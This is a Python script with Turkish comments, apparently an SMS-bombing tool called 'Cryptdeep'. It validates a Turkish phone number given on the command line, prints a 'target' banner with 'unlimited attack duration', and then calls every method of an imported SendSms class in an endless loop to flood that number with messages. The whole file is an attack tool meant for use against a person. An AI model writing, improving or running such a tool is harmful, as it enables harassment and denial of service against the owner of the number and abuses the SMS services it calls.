## Proje : Cryptdeep
from colorama import Fore, Style, Back
from time import sleep
from os import system
from sms import SendSms
import argparse
import re
import phonenumbers
import shutil
parser = argparse.ArgumentParser()
system("cls||clear")

def printf(*args):
    for value in args:
        print(f"  {value}  ")

def phone_verification(phone_number):
    global phone_verification_status, tel, tel_0, tel_5, error_code
    tel_0 = None
    tel_5 = None

    error_code = ""
    phone_verification_status = False
    tel = phone_number
    tel = tel.strip().replace(" ", "")
    if tel.startswith("+90"):
        tel = tel[3:]
    elif tel.startswith("90"):
        tel = tel[2:]
    elif tel.startswith("0"):
        tel = tel[1:]
    if len(tel) != 10:
        error_code = f"11 haneli telefon numaraları kabul edilir!"
        phone_verification_status = False
    elif len(tel) == 1:
        error_code = f"telefon numarası belirtilmedi!"
        phone_verification_status = False
    else:
        # Phonenumbers kütüphanesi ile telefon numarası kontrolü
        try:
            parsed_number = phonenumbers.parse(tel, "TR")
            if phonenumbers.is_valid_number(parsed_number):
                phone_verification_status = True
                tel_0 = f"0{tel}"
                tel_5 = tel[1:]
            else:
                error_code = f"{tel} telefon numarası kullanılmamaktadır."
                phone_verification_status = False
        except phonenumbers.phonenumberutil.NumberParseException:
            error_code = f"{tel} telefon numarası kullanılmamaktadır."
            phone_verification_status = False
    
    # Sonucu döndür
    return (phone_verification_status, tel_0, tel_5, error_code)


parser.add_argument("--tel", help="Telefon numarası", required=True)
args = parser.parse_args()

phone_verification(args.tel)
tel_no = tel
aralik = 0
mail = ""
kere = None
banner_metni = f'''{Fore.YELLOW}
@@@  @@@   @@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!@!  !!!  !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
:!:  !!:  !!:  !!!  !!:  !!!  !!:  !!!       !:!  
 ::!!:!   :!:  !:!  :!:  !:!  :!:  !:!      !:!   
  ::::    ::::: ::   :::: ::  ::::: ::  :::: ::   
   :       : :  :   :: :  :    : :  :   :: : :    
{Style.RESET_ALL}
'''

def banner_ortalama(*args):
    # terminal penceresinin boyutunu al
    terminal_genisligi, terminal_yuksekligi = shutil.get_terminal_size()

    # Banner'ın sol tarafındaki boşluk miktarını hesapla
    sol_bosluk_miktari = (terminal_genisligi - len(banner_metni.split('\n')[1])) // 2

    # Banner'ı ortalamak için soldaki boşluğu ekleyin ve ekrana yazdırın
    for value in args:
        for satir in value.split('\n'):
            print(' ' * sol_bosluk_miktari + satir)

if phone_verification_status == True:


    banner_ortalama(banner_metni)
    banner_ortalama(f"Hedef : +90{tel_no}  || Saldırı Süresi : Sınırsız")

    sms = SendSms(tel_no, mail)
    while True:
        for attribute in dir(SendSms):
            attribute_value = getattr(SendSms, attribute)
            if callable(attribute_value):
                if attribute.startswith('__') == False:
                    exec("sms."+attribute+"()")
                    sleep(aralik)
else:
    printf(f"{Back.RED}{Fore.WHITE} HATA {Style.RESET_ALL} -> {error_code}") 